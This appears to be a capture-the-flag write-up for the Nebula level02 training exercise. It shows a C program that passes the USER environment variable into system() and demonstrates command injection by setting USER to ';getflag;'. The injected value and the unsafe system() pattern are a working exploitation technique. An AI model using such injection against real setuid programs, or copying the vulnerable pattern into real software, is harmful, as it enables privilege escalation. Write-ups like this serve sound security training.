# About
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.
# Exploitation

```c
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
printf("about to call system(\"%s\")\n", buffer);

system(buffer);
```
This program get environment variable named `USER` and execute system function.
```bash
level02@nebula:~$ /home/flag02/flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
```
As the `USER` is level02, this program executes "/bin/echo level02 is cool".

By changing `USER` variable with ";getflag;", this program executes shell with "/bin/echo ", "getflag", "is cool".

```bash
level02@nebula:~$ /home/flag02/flag02
about to call system("/bin/echo ;getflag; is cool")

You have successfully executed getflag on a target account
sh: is: command not found
level02@nebula:~$ 
```
